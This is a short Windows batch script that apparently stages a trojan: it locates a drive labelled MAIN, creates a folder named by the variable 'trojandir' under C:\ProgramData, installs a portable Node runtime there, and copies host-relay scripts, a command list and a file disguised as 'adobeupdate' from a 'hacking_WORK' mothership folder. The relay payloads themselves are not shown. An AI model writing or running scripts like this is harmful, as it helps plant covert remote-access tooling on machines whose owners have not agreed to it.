FOR /F "tokens=1,2" %%A IN ('wmic logicaldisk get name^,volumename 2^>nul ^| findstr /I /C:"MAIN"') DO SET "DRIVE_LETTER=%%A"

set mothership=%DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets
set trojandir=C:\ProgramData\owd
cd /d %trojandir%

mkdir %trojandir%\.vscode

set nodedir=%trojandir%\node\node-v26.4.0-win-x64

IF NOT EXIST %nodedir% (
    robocopy %DRIVE_LETTER%\__Binaries\node-v26.4.0-win-x64 %nodedir% /E
)

IF NOT EXIST %nodedir%\node.exe (
    echo node exe missing
)

for /f "tokens=*" %%i in ('%nodedir%\node.exe --version') do set "output=%%i"
set "output=%output: =%"

IF NOT "%output%"=="v26.4.0" (
    echo node version not correct
)

copy /y %mothership%\.vscode\*.* %trojandir%\.vscode 

set files=nodehostrelay.cmdslist.js
set files=%files% nodehostrelay.cmdslist.js
set files=%files% nodehostrelayhelper.js
set files=%files% nodehostrelay.js
set files=%files% pythonrelay.py
set files=%files% pythonhostrelay.py
set files=%files% tpl_launch.cmd
set files=%files% adobeupdate

for %%A in (%files%) do (
    IF NOT EXIST %trojandir%\%%A (
        copy /y %mothership%\%%A %trojandir%\%%A
    ) ELSE (
        echo ERROR -- file exists %trojandir%\%%A 
    )
)
